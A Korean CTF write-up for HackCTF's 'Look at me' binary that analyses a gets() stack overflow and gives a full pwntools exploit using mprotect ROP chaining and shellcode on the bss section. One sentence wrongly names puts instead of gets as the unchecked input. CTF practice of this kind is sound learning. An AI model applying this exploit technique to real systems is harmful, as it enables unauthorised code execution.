**HackCTF - Look at me**

| layout | title                         | auther   | categories | tags           |
| ------ | ----------------------------- | -------- | ---------- | -------------- |
| post   | HackCTF - Look at me | Y3oj4eng | writeup    | writeupwargame |

# Analysis
---

## `file & checksec`
```bash
mac at ubuntu in ~/Desktop/hackCTF
$ file lookatme
lookatme: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=d2a1b10d006e4d6c4e84305383b4dc86481d87da, not stripped
```

```bash
gdb-peda$ checksec         
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

해당 바이너리는 `32-bit ELF` 바이너리이며, `static linked` 방식을 채택하였다. `mitigation`은 `NX` bit만 적용되었다.

역시 `statically linked` 방식을 이용해서 그런지 파일의 크기가 타 바이너리에 비하여 매우 크다.

바이너리를 실행시켜본다.

```bash
mac at ubuntu in ~/Desktop/hackCTF
$ ./lookatme
Hellooooooooooooooooooooo
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    10373 segmentation fault (core dumped)  ./lookatme
```

바이너리를 실행시키면 `Hellooooooooooooooooooo`라는 문자열을 출력한 뒤, 사용자로부터 값을 입력받는다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // ST1C_4

  setvbuf(stdout, 0, 2, 0);
  v3 = getegid();
  setresgid(v3, v3, v3);
  look_at_me();
  return 0;
}
```

`main` 함수다.
별다른 루틴 없이 `look_at_me` 함수를 호출한다.

```c
int look_at_me()
{
  char v1; // [esp+0h] [ebp-18h]

  puts("Hellooooooooooooooooooooo");
  return gets(&v1);
}
```

`look_at_me` 함수에서는 `puts`를 통해 문자열을 출력한 뒤, `v1` 변수에 값을 입력받는다.

`v1` 변수는 `ebp-0x18`에 위치하며 `puts`는 입력을 받을떄 길이값을 검증하지 않아 `BOF` 취약점이 존재한다.

따라서 `look_at_me` 함수가 종료된 이후 복귀할 주소인 `return address`를 조작할 수 있다.

취약점을 찾는것은 매우 쉬웠으나 쉘을 실행시킬 방법을 찾기가 어려웠다..

바이너리 내에는 `system`, `exec` 계열의 실행 함수들도 없었으며 

쉘코드를 주입할수는 있었으나 `NX` 미티게이션으로 인해 스택 영역에 실행권한을 갖지 못한다.

머리를 굴리던중 환경변수를 이용해볼까 했으나 가능하다면 로컬에서나 가능할것 같았다.

도무지 방법이 떠오르지 않아 라업을 참고하였으며

`mprotect()`를 사용하여 `bss` 영역에 실행권한을 주고 문제를 풀어냈다.

역시 사람들은 똑똑하다..ㄷ

# Exploit
---

```python
from pwn import *

context.log_level = 'debug'

p = remote('ctf.j0n9hyun.xyz', 3017)
#p = process('./lookatme')
e = ELF('./lookatme')


# set the materials for Exploit
pr = 0x80bb312
pppr = 0x80bafb9
gets_addr = e.symbols['gets']
mprotect_addr = e.symbols['mprotect']
bss_start = 0x80ea000
bss = e.bss()       # bss = 0x80eaf80
shellcode = asm(shellcraft.i386.sh(), arch='i386')

# Exploit
payload = 'A'*28                        # buf dummy
payload += p32(gets_addr)               # ret -> gets()
payload += p32(pr)                      # pop ebx; ret; RTL_Chaining
payload += p32(bss)                     # Insert bss_addr

payload += p32(mprotect_addr)           # ret -> mprotect_addr
payload += p32(pppr)                    # pop ebx; esi; edi; ret
payload += p32(bss_start)               # addr
payload += p32(8000)                    # len
payload += p32(7)                       # prot (rwx)
payload += p32(bss)                     # ret -> bss_addr

p.recvuntil('Hellooooooooooooooooooooo')
p.sendline(payload)
p.sendline(shellcode)                   # when the gets() function called, write shellcode on bss section

p.interactive()
```






